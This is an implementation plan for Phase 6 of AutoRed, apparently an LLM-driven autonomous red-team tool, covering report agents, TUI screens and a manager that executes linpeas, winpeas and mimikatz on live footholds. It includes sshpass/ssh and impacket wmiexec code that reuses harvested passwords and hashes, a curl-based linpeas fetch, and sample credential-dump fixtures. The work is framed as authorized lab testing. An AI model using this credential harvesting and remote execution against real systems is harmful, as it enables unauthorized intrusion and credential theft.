# AutoRed Phase 6 — Report Agent + Full TUI + Cross-Engagement Memory Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the Report Agent (four sub-agents producing an executive summary, a full technical report, a MITRE ATT&CK mapping, and extracted lessons; delivered as `report.md` + `report.pdf` with lessons persisted into the cross-engagement SQLite + Chroma stores), the full TUI (seven new screens plus a real `--tui` launch where the LangGraph orchestrator runs alongside the Textual app), the CLI polish layer (`report` / `state` / full `resume` / SQLite-backed `engagements` / full `roe-wizard`), and the foothold session manager that finally executes linpeas / winpeas / mimikatz on live footholds instead of saving command strings as evidence — closing the spec's six-phase roadmap with a full kill chain that runs end-to-end in sandbox mode and reports on itself.

**Architecture:** The Report Agent is a new full-auto LangGraph node (`report_node`) that closes the graph: `cleanup → report → END`, replacing the `report_phase1` stub. It follows the established agent pattern — an async node function that dispatches to specialist `@tool` sub-agents (ExecSummaryWriter, TechReportWriter, MITREMapper, LessonExtractor), each with a pure-helper core that is unit-tested without LLM access. Two sub-agents are **deterministic by design**: MITREMapper maps state records to technique IDs via an embedded ATT&CK index (never an LLM — technique-ID hallucination is a documented failure mode), and every LLM-writing sub-agent carries a deterministic template fallback so a refusal or API failure can never cost the operator their engagement deliverable. Report assembly lives in a new `autored/reporting/` package (markdown assembly, PDF rendering via WeasyPrint with graceful degradation, memory persistence). Secret material is redacted at every write path — reports, `lessons.json`, the SQLite `credential_value` column (sha256 only), and Chroma metadata. The TUI grows from two screens to nine: `AutoRedApp` gains a background-orchestrator task (`--tui` finally launches the real app), a `current_state` handle, and app-level actions that construct the Phase 6 screens; the EventBus pattern from Phases 3–5 is untouched. The foothold session manager is a small top-level module (`autored/foothold_session.py`) installed by `postex_node` for the duration of the post-ex pass: it resolves credentials from `state.harvested_secrets`, transports commands over the Phase 5 impacket remote-exec tools (Windows) or `sshpass`+`ssh` (Linux), and lets the Phase 4 enum/cred-harvest wrappers execute-and-parse for real while keeping their evidence-string behavior when no transport exists.

**Tech Stack (Phase 6 additions):**
- `weasyprint==62.3` (spec-pinned, Phase 6 only — PDF rendering; requires system Pango/Cairo libs, handled by graceful degradation)
- `markdown==3.7` (plan addition — markdown→HTML conversion feeding WeasyPrint; tiny pure-Python, documented deviation from the spec's pinned list)
- Everything else already in `pyproject.toml` (textual 0.79.1, typer, rich, chromadb, aiosqlite, langgraph)

**Spec:** `docs/superpowers/specs/2026-09-21-autored-design.md` (Phase 6 portions: §1.2, §3.1–§3.4, §5.3, §6.7, §7.4, §9.1, §9.2, §13.6, §14, §17.1–§17.12)

---

## Global Constraints

- Phase 6 assumes Phases 1–5 are complete: `build_phase5_graph` (topology `roe_gate_start → recon → vuln → exploit → postex → lateral → cleanup → report_phase1 → END`), `lateral_node`, `cleanup_node`, and the Phase 5 tool layer (`impacket_wmiexec` / `impacket_psexec` / `impacket_smbexec`, `crackmapexec`, tunnel + cleanup tools) all exist and all tests pass. Do not modify Phase 1–5 contracts unless a task explicitly says to.
- The Report Agent is **full-auto** — no HitL gates (spec §2.4). It runs at the end regardless of engagement outcome; a failed/empty engagement still produces a valid minimal report.
- Report deliverables land at the spec §3.2 paths: `engagements/<id>/report.md`, `engagements/<id>/report.pdf`, `engagements/<id>/lessons.json`. Raw output and evidence folders are never touched by the report pipeline.
- **Secret-redaction rule (spec §3.3):** plaintext passwords, NTLM hashes, Kerberos tickets, and keys never appear in `report.md`, `report.pdf`, `lessons.json`, the SQLite `credential_value` column (sha256 hex only), or Chroma documents/metadata. The report shows usernames + secret *types* + a short fingerprint (`sha256(value)[:8]`) for traceability.
- Cross-engagement memory uses the **existing** modules — `autored/persistence/engagement_db.py` (SQLite `db/engagements.sqlite`: engagements / findings / credentials / lessons tables) and `autored/persistence/chroma_store.py` (collections `finding_embeddings` + `technique_patterns`). Phase 6 adds the *write* side at report time; the Phase 2 read side (Vuln Agent's `query_similar_findings`) is unchanged and finally has data to find.
- New LLM task keys are not needed — the router already routes `write_report` → Sonnet 4.5. Report sub-agents call `get_model("write_report")` exactly like the Vuln Agent calls `get_model("synthesize_findings")`.
- MITREMapper is rules-based (embedded technique index, ~35 entries) — no LLM. Technique IDs that are not in the index are **never** emitted (anti-hallucination guard, Review Focus #4). This mirrors the RoE Guard's non-LLM design philosophy.
- **TUI screens shipped in Phase 6 (7, from spec §13.6 / §17.12):** EngagementListScreen, EvidenceViewerScreen, StateInspectorScreen, FindingsTableScreen, LogViewerScreen, RoEEditorScreen, AttackGraphScreen. **AgentDetailScreen is descoped** — spec §17.3's table lists it, but §13.6's ship list and §17.12's criteria omit it, and StateInspectorScreen covers agent-state browsing; documented deviation, ship-criteria list wins.
- Keybindings follow spec §17.6 (`q`/`d`/`e`/`l`/`f`/`s`/`?`) plus two plan additions the spec's table lacks for screens it requires: `v` → EvidenceViewerScreen, `g` → AttackGraphScreen, `r` → RoEEditorScreen. Screen-local bindings (e.g. HitL modal `y`/`n`/`e`/`s`) take precedence while that screen is focused, so the letter collisions with global bindings are safe.
- WeasyPrint's system libraries (Pango/Cairo) may be absent — `render_pdf` must degrade to `pdf_path=None` with a warning, never raise (Review Focus #5). The markdown report is always written first and is the deliverable of record.
- `pytest` asyncio mode is `auto` (no `@pytest.mark.asyncio` decorators needed); TUI tests use Textual 0.79.1's `app.run_test()` pilot exactly as spec §17.11 shows; CLI tests use `typer.testing.CliRunner`.
- E2E test target: GoAD lab (same env vars as Phase 4/5 E2E: `AUTORED_E2E=1`, `AUTORED_GOAD_TARGET`, `AUTORED_LHOST`), gated and skipped by default.
- Code style: `ruff` line-length=100, target Python 3.12. Git: conventional commits (`feat:`, `test:`, `chore:`, `docs:`).
- The spec's "demo video" ship item (§13.6) is an operator follow-up, not an automatable task — Task 18 adds a README "Recording a demo" section with exact `asciinema`/`vhs` instructions instead.

## Review Focus

Failure modes the spec implies but no single task's tests exercise — each gets a test added to the owning task:

1. **Report on an empty or failed engagement** — zero hosts, zero findings, all exploits exhausted → `report_node` still writes a valid minimal `report.md` (with an explicit "no findings" body), sets `phase="done"`, and never raises. The report pipeline is the last node; a crash here destroys the entire engagement's deliverable. Test in Task 9.
2. **Secret material leaks into a deliverable** — a harvested NTLM hash or plaintext password appears verbatim in `report.md`, `lessons.json`, the SQLite `credentials` table, or a Chroma document → the write paths must show only the sha256 fingerprint. A leak here is a real-world operational-security failure, not a cosmetic bug. Tests in Task 5 (markdown redaction), Task 8 (DB + Chroma values).
3. **LLM refusal or API failure at report time loses the deliverable** — Sonnet refuses or 500s during exec-summary/tech-report/lesson generation → deterministic template fallback produces the sections anyway (`used_fallback=True` in the sub-agent output, warning logged). Tests in Tasks 4, 5, 6.
4. **MITRE mapper invents technique IDs** — an unmapped activity produces a plausible-looking but nonexistent ATT&CK ID → the mapper may only emit IDs present in the embedded index; unknown activity is skipped, never guessed. Test in Task 3.
5. **PDF renderer unavailable** — WeasyPrint import fails (missing Pango/Cairo system libs on a bare container) → `render_pdf` returns `None`, `report.md` is still written, `ReportPaths.pdf_path=None`, the engagement completes green. Test in Task 7.

## File Structure

Files created/modified in Phase 6:

```
autored/
├── pyproject.toml                              # Task 7 (MODIFY: + weasyprint==62.3, markdown==3.7)
├── autored/
│   ├── state.py                                # Task 1 (MODIFY: + lessons, mitre_mappings, report_paths fields)
│   ├── models/
│   │   ├── report.py                           # Task 1 (NEW: Lesson, MitreMapping, ReportPaths)
│   │   └── __init__.py                         # Task 1 (MODIFY: export new models)
│   ├── foothold_session.py                     # Task 2 (NEW: FootholdSessionManager + install/get helpers)
│   ├── tools/
│   │   ├── linpeas.py                          # Task 2 (MODIFY: execute via installed session manager)
│   │   ├── winpeas.py                          # Task 2 (MODIFY: execute via installed session manager)
│   │   └── mimikatz.py                         # Task 2 (MODIFY: execute via installed session manager)
│   ├── subagents/
│   │   ├── __init__.py                         # Tasks 3-6 (MODIFY: export new sub-agents)
│   │   ├── mitremapper.py                      # Task 3 (NEW: embedded index + rules-based mapper)
│   │   ├── execsummarywriter.py                # Task 4 (NEW)
│   │   ├── techreportwriter.py                 # Task 5 (NEW)
│   │   └── lessonextractor.py                  # Task 6 (NEW)
│   ├── reporting/
│   │   ├── __init__.py                         # Task 7 (NEW package)
│   │   ├── pdf.py                              # Task 7 (NEW: render_pdf + graceful degradation)
│   │   ├── memory_writer.py                    # Task 8 (NEW: persist to SQLite + Chroma)
│   │   └── markdown_report.py                  # Task 9 (NEW: assemble_markdown_report)
│   ├── agents/
│   │   ├── report.py                           # Task 9 (NEW: report_node)
│   │   └── postex.py                           # Task 2 (MODIFY: install/uninstall session manager around foothold loop)
│   ├── graph.py                                # Task 10 (MODIFY: build_phase6_graph)
│   ├── cli.py                                  # Tasks 10, 11, 12, 17 (MODIFY: phase6 graph, report/state/resume/engagements, --tui launch, wizard)
│   ├── config.py                               # Task 17 (MODIFY: + validate_roe_yaml)
│   └── tui/
│       ├── app.py                              # Tasks 12, 13 (MODIFY: orchestrator task, current_state, actions, bindings)
│       ├── screens/
│       │   ├── __init__.py                     # Tasks 13-17 (MODIFY: export new screens)
│       │   ├── engagement_list.py              # Task 13 (NEW)
│       │   ├── evidence_viewer.py              # Task 14 (NEW)
│       │   ├── log_viewer.py                   # Task 14 (NEW)
│       │   ├── state_inspector.py              # Task 15 (NEW)
│       │   ├── findings_table.py               # Task 15 (NEW)
│       │   ├── attack_graph.py                 # Task 16 (NEW)
│       │   └── roe_editor.py                   # Task 17 (NEW)
│       └── app.tcss                            # Task 13 (MODIFY: screen styles)
├── tests/
│   ├── unit/
│   │   ├── models/
│   │   │   ├── test_report_models.py           # Task 1 (NEW)
│   │   │   └── test_state.py                   # Task 1 (MODIFY — append)
│   │   ├── test_foothold_session.py            # Task 2 (NEW)
│   │   ├── tools/
│   │   │   ├── test_linpeas_execute.py         # Task 2 (NEW)
│   │   │   └── test_report_pdf.py              # Task 7 (NEW)
│   │   ├── subagents/
│   │   │   ├── test_mitremapper.py             # Task 3 (NEW)
│   │   │   ├── test_execsummarywriter.py       # Task 4 (NEW)
│   │   │   ├── test_techreportwriter.py        # Task 5 (NEW)
│   │   │   └── test_lessonextractor.py         # Task 6 (NEW)
│   │   ├── reporting/
│   │   │   ├── test_memory_writer.py           # Task 8 (NEW)
│   │   │   └── test_markdown_report.py         # Task 9 (NEW)
│   │   ├── test_graph.py                       # Task 10 (MODIFY — append phase6 shape tests)
│   │   └── tui/
│   │       ├── test_app_launch.py              # Task 12 (NEW)
│   │       ├── test_engagement_list.py         # Task 13 (NEW)
│   │       ├── test_evidence_log_viewer.py     # Task 14 (NEW)
│   │       ├── test_state_findings_screens.py  # Task 15 (NEW)
│   │       ├── test_attack_graph.py            # Task 16 (NEW)
│   │       └── test_roe_editor.py              # Task 17 (NEW)
│   ├── integration/
│   │   ├── test_report_agent.py                # Task 9 (NEW)
│   │   └── test_phase6_pipeline.py             # Task 10 (NEW — full mocked pipeline incl. report)
│   ├── e2e/
│   │   └── test_phase6_fullchain.py            # Task 18 (NEW — GoAD full chain, gated)
│   └── fixtures/
│       ├── linpeas_sample_output.txt           # Task 2 (NEW — real-shaped linpeas output)
│       ├── winpeas_sample_output.txt           # Task 2 (NEW)
│       └── mimikatz_sample_output.txt          # Task 2 (NEW)
└── docs/superpowers/plans/
    └── 2026-09-22-autored-phase6-report-tui-polish.md   # this file
```

---

## Task 1: Report Models + State Fields

**Files:**
- Create: `autored/models/report.py`
- Modify: `autored/state.py`, `autored/models/__init__.py`
- Test: `tests/unit/models/test_report_models.py` (NEW), `tests/unit/models/test_state.py` (MODIFY — append)

**Interfaces:**
- Consumes: nothing new — pure Pydantic models.
- Produces:
  - `Lesson(id: str, category: Literal["technique_worked","cve_exploited","tool_issue","opsec_failure","misconfiguration","other"], body: str, mitre_technique_id: str | None = None, created_at: datetime)` — field names and the category Literal match the SQLite `lessons` table's CHECK constraints in `engagement_db.py` exactly, so Task 8 writes rows without translation. (**Typed deviation from spec §9.1** — the spec declares `lessons: list[str]`; a typed model is required to fill the table's `category` / `mitre_technique_id` columns, so the plan upgrades the field to `list[Lesson]`.)
  - `MitreMapping(technique_id: str, technique_name: str, tactic: str, source: str, detail: str)` — `source` names the state collection the mapping came from (`"foothold"`, `"persistence"`, `"pivot"`, …); used by Task 9's MITRE table and Task 16's attack graph.
  - `ReportPaths(markdown_path: str, pdf_path: str | None = None, lessons_path: str = "")` — `pdf_path=None` when WeasyPrint is unavailable (Review Focus #5).
  - New `EngagementState` fields (all default-empty so every Phase 1–5 test keeps passing): `lessons: list[Lesson]`, `mitre_mappings: list[MitreMapping]`, `report_paths: ReportPaths | None = None`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/models/test_report_models.py
"""Unit tests for Phase 6 report models (spec §9.2 + plan additions)."""
from datetime import datetime

import pytest
from pydantic import ValidationError

from autored.models.report import Lesson, MitreMapping, ReportPaths


def test_lesson_fields_match_sqlite_lessons_table():
    """Category values must be exactly the SQLite CHECK constraint set."""
    lesson = Lesson(category="technique_worked", body="EternalBlue worked on SMB-exposed host")
    assert lesson.id  # uuid default factory
    assert lesson.mitre_technique_id is None
    assert isinstance(lesson.created_at, datetime)


def test_lesson_accepts_every_category():
    for category in (
        "technique_worked", "cve_exploited", "tool_issue",
        "opsec_failure", "misconfiguration", "other",
    ):
        assert Lesson(category=category, body="x").category == category


def test_lesson_rejects_unknown_category():
    with pytest.raises(ValidationError):
        Lesson(category="great_success", body="x")


def test_mitre_mapping_fields():
    m = MitreMapping(
        technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="persistence",
        source="persistence",
        detail="scheduled_task on 192.168.56.22",
    )
    assert m.technique_id.startswith("T")
    assert m.tactic == "persistence"


def test_report_paths_pdf_optional():
    p = ReportPaths(
        markdown_path="engagements/e1/report.md",
        lessons_path="engagements/e1/lessons.json",
    )
    assert p.pdf_path is None  # weasyprint unavailable → None, never raised
    p2 = ReportPaths(
        markdown_path="engagements/e1/report.md",
        pdf_path="engagements/e1/report.pdf",
        lessons_path="engagements/e1/lessons.json",
    )
    assert p2.pdf_path.endswith(".pdf")
```

Append to `tests/unit/models/test_state.py`:

```python
def test_state_has_phase6_report_fields():
    """Phase 6 adds lessons / mitre_mappings / report_paths (default empty)."""
    from autored.models.report import Lesson, MitreMapping, ReportPaths

    state = _sandbox_state()
    assert state.lessons == []
    assert state.mitre_mappings == []
    assert state.report_paths is None

    state.lessons = [Lesson(category="other", body="test lesson")]
    state.mitre_mappings = [MitreMapping(
        technique_id="T1046", technique_name="Network Service Discovery",
        tactic="discovery", source="recon", detail="nmap sweep",
    )]
    state.report_paths = ReportPaths(
        markdown_path="engagements/x/report.md",
        pdf_path=None,
        lessons_path="engagements/x/lessons.json",
    )
    assert state.lessons[0].body == "test lesson"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/models/test_report_models.py tests/unit/models/test_state.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.models.report'`

- [ ] **Step 3: Write the model file**

```python
# autored/models/report.py
"""Phase 6 report models.

``Lesson`` mirrors the SQLite ``lessons`` table (engagement_db.py) field
for field — category values are the table's CHECK constraint set, so the
memory writer needs no translation layer. ``MitreMapping`` is one row of
the report's ATT&CK matrix; ``ReportPaths`` records where the deliverables
landed so the CLI / TUI can open them.

Typed deviation from spec §9.1: the spec declares ``lessons: list[str]``
on EngagementState, but the lessons table requires category + MITRE ID
per row, so the plan stores ``list[Lesson]`` instead.
"""
from datetime import datetime
from typing import Literal
from uuid import uuid4

from pydantic import BaseModel, Field

LessonCategory = Literal[
    "technique_worked",
    "cve_exploited",
    "tool_issue",
    "opsec_failure",
    "misconfiguration",
    "other",
]


class Lesson(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid4()))
    category: LessonCategory
    body: str
    mitre_technique_id: str | None = None
    created_at: datetime = Field(default_factory=datetime.utcnow)


class MitreMapping(BaseModel):
    technique_id: str
    technique_name: str
    tactic: str
    source: str
    detail: str


class ReportPaths(BaseModel):
    markdown_path: str
    pdf_path: str | None = None
    lessons_path: str = ""
```

Modify `autored/models/__init__.py` — add to imports and `__all__`:

```python
from autored.models.report import Lesson, MitreMapping, ReportPaths
```

Modify `autored/state.py` — extend the import block and add three fields after `summary: str = ""`:

```python
from autored.models.report import Lesson, MitreMapping, ReportPaths
```

```python
    # Report (Phase 6+)
    lessons: list[Lesson] = Field(default_factory=list)
    mitre_mappings: list[MitreMapping] = Field(default_factory=list)
    report_paths: ReportPaths | None = None
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/models/ -v`
Expected: PASS (all existing model tests plus the new ones)

- [ ] **Step 5: Commit**

```bash
git add autored/models/report.py autored/models/__init__.py autored/state.py \
        tests/unit/models/test_report_models.py tests/unit/models/test_state.py
git commit -m "feat: add Phase 6 report models (Lesson, MitreMapping, ReportPaths)"
```

---

## Task 2: FootholdSessionManager — Execute Enum Tools on Live Footholds

**Files:**
- Create: `autored/foothold_session.py`
- Modify: `autored/tools/linpeas.py`, `autored/tools/winpeas.py`, `autored/tools/mimikatz.py`, `autored/agents/postex.py`
- Test: `tests/unit/test_foothold_session.py` (NEW), `tests/unit/tools/test_linpeas_execute.py` (NEW)
- Fixtures: `tests/fixtures/linpeas_sample_output.txt`, `tests/fixtures/winpeas_sample_output.txt`, `tests/fixtures/mimikatz_sample_output.txt` (NEW)

**Interfaces:**
- Consumes: `Foothold` / `Secret` from `autored.models` (Phase 3/4, unchanged); `impacket_wmiexec(username, password, nthash, target, command, engagement_id) -> ImpacketRemoteResult` from `autored.tools.impacket_remote` (Phase 5 Task 2); `run_subprocess(cmd, timeout) -> SubprocessResult` from `autored.subprocess_runner`.
- Produces:
  - `FootholdCommandResult(command: str, stdout: str, stderr: str, returncode: int, duration_sec: float, success: bool)` — the execution outcome the enum wrappers parse.
  - `CredentialBundle(username: str = "", password: str = "", nthash: str = "")` — resolved credentials for one host.
  - `FootholdSessionManager(state: EngagementState)` with:
    - `find_foothold(foothold_id: str) -> Foothold | None`
    - `execute(foothold: Foothold, command: str, timeout: int = 300) -> FootholdCommandResult` — dispatch: `access_type == "ssh"` → `sshpass -p <password> ssh -o StrictHostKeyChecking=no <user>@<host> <command>` via `run_subprocess`; `access_type in ("winrm", "rpc")` → `impacket_wmiexec(...)` with the resolved bundle (password auth, or `-hashes` style when only an NTLM hash exists); any other access type → `success=False, stderr="no transport for access_type ..."`.
  - Module-level install points (single-engagement-per-process, documented): `install(manager)`, `uninstall()`, `get_installed() -> FootholdSessionManager | None`, and the `foothold_session_context(state)` context manager that installs/uninstalls around the post-ex pass — this is what `postex_node` wraps its foothold loop in.
  - `_find_credentials_for_host(state, host_ip) -> CredentialBundle` — password secrets preferred; NTLM hashes fill `nthash`; usernames parsed from `Secret.source` (`"mimikatz:<provider>/<username>"` format written by credharvester), falling back to the foothold's own username.

**Design note — why a module-level install instead of threading a parameter:** the sub-agents (`linuxenum_subagent`, `windowsenum_subagent`, `credharvester_subagent`) invoke the tools via `.ainvoke({...})` dicts and are themselves patched by name in the Phase 4 tests. Threading a session-manager argument through every sub-agent input model would touch six Phase 4 files and break their test patches for zero benefit. A context-local install keeps the Phase 4 signatures untouched, keeps the existing tests green, and matches the one-engagement-per-process reality of the CLI. The context manager guarantees uninstall even on exceptions.

- [ ] **Step 1: Write the fixtures**

```text
# tests/fixtures/linpeas_sample_output.txt
══╣ Check if we are inside docker
Nope

╚══════════╣ SUID - Check easy privesc methods for file
rwxr-xr-x 1 root root 40K Sep  1 2024 /usr/bin/find
rwsr-xr-x 1 root root 59K Oct  2 2024 /usr/bin/passwd

╚══════════╣ Cron jobs
*/5 * * * * root /opt/backup.sh
0 2 * * * root /usr/local/bin/cleanup.sh

╚══════════╣ Sudo
user ALL=(ALL) NOPASSWD: /usr/bin/vim

╚══════════╣ Interesting writable files
/etc/backup.cfg

Known vulnerabilities relevant to this system: CVE-2021-4034 CVE-2022-0847
```

```text
# tests/fixtures/winpeas_sample_output.txt
╚══════════╣ Autologon Registry
DefaultDomainName : GOAD
DefaultUserName   : administrator
DefaultPassword   : Passw0rd!

╚══════════╣ Modifiable Services
C:\Windows\System32\spoolsv.exe (Print Spooler) - can be reconfigured

╚══════════╣ Unattended Files
C:\Windows\Panther\unattend.xml

╚══════════╣ Scheduled tasks
AutoRedUpdate (runs as SYSTEM daily)
```

```text
# tests/fixtures/mimikatz_sample_output.txt
Authentication Id : 0 ; 996 (00000000:000003e8)
Session           : Service from 0
User Name         : WIN-SRV02$
Domain            : GOAD
Logon Server      : DC01
Logon Time        : 9/21/2026 8:14:37 AM
SID               : S-1-5-20
        msv :
         * Username : WIN-SRV02$
         * Domain   : GOAD
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : 404f6f829ac855b7c9e1c3b2b2e0a1d4c5f6a7b8
        tspkg :
        wdigest :
         * Username : administrator
         * Domain   : GOAD
         * Password : Password1!
        kerberos :
         * Username : administrator
         * Domain   : GOAD
         * NTLM     : 8a4f6d9c2b7e1f3a5d8c4b6e2f0a1d3c
```

- [ ] **Step 2: Write the failing tests**

```python
# tests/unit/test_foothold_session.py
"""Unit tests for the Phase 6 foothold session manager."""
from datetime import datetime

from autored.models import Foothold, Secret
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.foothold_session import (
    CredentialBundle,
    FootholdCommandResult,
    FootholdSessionManager,
    _find_credentials_for_host,
    foothold_session_context,
    get_installed,
    install,
    uninstall,
)


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state() -> EngagementState:
    return EngagementState(
        engagement_id="e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(),
    )


def _foothold(access_type: str = "ssh", username: str = "root") -> Foothold:
    return Foothold(
        id="f-1", host_ip="10.0.0.5", username=username, context="user",
        method="ssh_brute", access_type=access_type,
        evidence_path="evidence/f1.txt",
        established_at=datetime.utcnow(), hypothesis_rank=1,
    )


def test_find_credentials_prefers_password_and_parses_username():
    state = _state()
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="password",
               secret_value="Passw0rd!", source="mimikatz:wdigest/administrator"),
        Secret(host_ip="10.0.0.5", secret_type="hash",
               secret_value="8a4f6d9c2b7e1f3a5d8c4b6e2f0a1d3c",
               source="mimikatz:kerberos/administrator"),
        Secret(host_ip="10.0.0.9", secret_type="password",
               secret_value="OTHERHOST", source="mimikatz:wdigest/other"),
    ]
    bundle = _find_credentials_for_host(state, "10.0.0.5")
    assert bundle.password == "Passw0rd!"
    assert bundle.nthash == "8a4f6d9c2b7e1f3a5d8c4b6e2f0a1d3c"
    assert bundle.username == "administrator"  # parsed from source, not the OTHERHOST secret


def test_find_credentials_falls_back_to_foothold_username():
    state = _state()
    state.footholds = [_foothold(access_type="winrm", username="bob")]
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="hash",
               secret_value="a" * 32, source="sam_dump"),  # no slash in source
    ]
    bundle = _find_credentials_for_host(state, "10.0.0.5")
    assert bundle.username == "bob"
    assert bundle.nthash == "a" * 32
    assert bundle.password == ""


async def test_execute_ssh_uses_sshpass(monkeypatch):
    from autored.subprocess_runner import SubprocessResult

    calls = {}

    async def fake_run_subprocess(cmd, timeout=300):
        calls["cmd"] = cmd
        calls["timeout"] = timeout
        return SubprocessResult(
            stdout="uid=0(root)", stderr="", returncode=0,
            duration_sec=0.5, command="sshpass",
        )

    import autored.foothold_session as fs
    monkeypatch.setattr(fs, "run_subprocess", fake_run_subprocess)

    state = _state()
    state.footholds = [_foothold(access_type="ssh", username="root")]
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="password",
               secret_value="hunter2", source="brute_force"),
    ]
    mgr = FootholdSessionManager(state)
    result = await mgr.execute(_foothold(access_type="ssh", username="root"), "id")
    assert result.success is True
    assert result.stdout == "uid=0(root)"
    assert calls["cmd"][:2] == ["sshpass", "-p"]
    assert "hunter2" in calls["cmd"]
    assert "root@10.0.0.5" in calls["cmd"]


async def test_execute_windows_uses_impacket_wmiexec(monkeypatch):
    from autored.tools.impacket_remote import ImpacketRemoteResult

    async def fake_wmiexec(username, password, nthash, target, command, engagement_id=""):
        return ImpacketRemoteResult(
            host_ip=target, method="wmiexec", command_executed=command,
            output="goaad\\administrator", success=True,
            raw_output_path="raw/x.out", duration_sec=1.2,
        )

    import autored.foothold_session as fs
    monkeypatch.setattr(fs, "impacket_wmiexec", fake_wmiexec)

    state = _state()
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="hash",
               secret_value="8a" * 16, source="mimikatz:kerberos/administrator"),
    ]
    mgr = FootholdSessionManager(state)
    result = await mgr.execute(_foothold(access_type="winrm", username="administrator"), "whoami")
    assert result.success is True
    assert result.stdout == "goaad\\administrator"


async def test_execute_no_transport_for_shell_footholds():
    state = _state()
    mgr = FootholdSessionManager(state)
    result = await mgr.execute(_foothold(access_type="webshell"), "id")
    assert result.success is False
    assert "no transport" in result.stderr


async def test_session_context_installs_and_uninstalls():
    state = _state()
    try:
        with foothold_session_context(state):
            assert get_installed() is not None
            assert get_installed().state.engagement_id == "e1"
        assert get_installed() is None  # uninstalled on clean exit
    finally:
        uninstall()


async def test_session_context_uninstalls_on_exception():
    state = _state()
    try:
        try:
            with foothold_session_context(state):
                assert get_installed() is not None
                raise RuntimeError("boom")
        except RuntimeError:
            pass
        assert get_installed() is None  # uninstalled even on exception
    finally:
        uninstall()


def test_find_foothold_by_id():
    state = _state()
    f = _foothold()
    state.footholds = [f]
    mgr = FootholdSessionManager(state)
    assert mgr.find_foothold("f-1") is f
    assert mgr.find_foothold("nope") is None
```

```python
# tests/unit/tools/test_linpeas_execute.py
"""Phase 6 Task 2 — linpeas/winpeas/mimikatz execute via installed session."""
from datetime import datetime
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

from autored.models import Foothold
from autored.foothold_session import FootholdCommandResult

FIXTURES = Path(__file__).parents[2] / "tests" / "fixtures"


def _foothold(access_type: str = "ssh") -> Foothold:
    return Foothold(
        id="f-1", host_ip="10.0.0.5", username="root", context="user",
        method="ssh_brute", access_type=access_type,
        evidence_path="evidence/f1.txt",
        established_at=datetime.utcnow(), hypothesis_rank=1,
    )


def _manager(stdout: str) -> MagicMock:
    mgr = MagicMock()
    mgr.find_foothold = MagicMock(return_value=_foothold())
    mgr.execute = AsyncMock(return_value=FootholdCommandResult(
        command="linpeas", stdout=stdout, stderr="",
        returncode=0, duration_sec=2.0, success=True,
    ))
    return mgr


async def test_linpeas_executes_and_parses_when_manager_installed(monkeypatch, tmp_path):
    import autored.tools.linpeas as lin

    # _save_raw writes into engagements/<id>/raw — point it at tmp_path
    async def fake_save_raw(tool, target, stdout, stderr, engagement_id):
        p = tmp_path / f"{tool}.out"
        p.write_text(stdout)
        return str(p)

    monkeypatch.setattr(lin, "_save_raw", fake_save_raw)
    monkeypatch.setattr(lin, "get_installed", lambda: _manager(
        (FIXTURES / "linpeas_sample_output.txt").read_text()))

    result = await lin.linpeas_run.ainvoke({
        "foothold_id": "f-1", "host_ip": "10.0.0.5", "engagement_id": "e1",
    })
    assert result.suid_binaries == [
        "rwxr-xr-x 1 root root 40K Sep  1 2024 /usr/bin/find",
        "rwsr-xr-x 1 root root 59K Oct  2 2024 /usr/bin/passwd",
    ]
    assert "CVE-2021-4034" in result.cves
    assert len(result.cron_jobs) == 2
    assert result.command.startswith("curl -sL")
    assert result.duration_sec == 2.0


async def test_winpeas_executes_and_parses(monkeypatch, tmp_path):
    import autored.tools.winpeas as wp

    async def fake_save_raw(tool, target, stdout, stderr, engagement_id):
        p = tmp_path / f"{tool}.out"
        p.write_text(stdout)
        return str(p)

    monkeypatch.setattr(wp, "_save_raw", fake_save_raw)
    monkeypatch.setattr(wp, "get_installed", lambda: _manager(
        (FIXTURES / "winpeas_sample_output.txt").read_text()))

    result = await wp.winpeas_run.ainvoke({
        "foothold_id": "f-1", "host_ip": "10.0.0.5", "engagement_id": "e1",
    })
    assert result.autologon_credentials == [{
        "domain": "GOAD", "username": "administrator", "password": "Passw0rd!",
    }]
    assert any("spoolsv" in s for s in result.modifiable_services)


async def test_mimikatz_executes_and_parses(monkeypatch, tmp_path):
    import autored.tools.mimikatz as mk

    async def fake_save_raw(tool, target, stdout, stderr, engagement_id):
        p = tmp_path / f"{tool}.out"
        p.write_text(stdout)
        return str(p)

    monkeypatch.setattr(mk, "_save_raw", fake_save_raw)
    monkeypatch.setattr(mk, "get_installed", lambda: _manager(
        (FIXTURES / "mimikatz_sample_output.txt").read_text()))

    result = await mk.mimikatz_wrapper.ainvoke({
        "foothold_id": "f-1", "host_ip": "10.0.0.5", "engagement_id": "e1",
    })
    by_provider = {c["provider"]: c for c in result.credentials}
    assert by_provider["msv"]["ntlm"] == "31d6cfe0d16ae931b73c59d7e0c089c0"
    assert by_provider["wdigest"]["password"] == "Password1!"


async def test_linpeas_falls_back_when_no_manager(monkeypatch, tmp_path):
    """No installed manager → Phase 4 evidence-string behavior, empty result."""
    import autored.tools.linpeas as lin

    async def fake_save_raw(tool, target, stdout, stderr, engagement_id):
        p = tmp_path / f"{tool}.out"
        p.write_text(stdout)
        return str(p)

    monkeypatch.setattr(lin, "_save_raw", fake_save_raw)
    monkeypatch.setattr(lin, "get_installed", lambda: None)

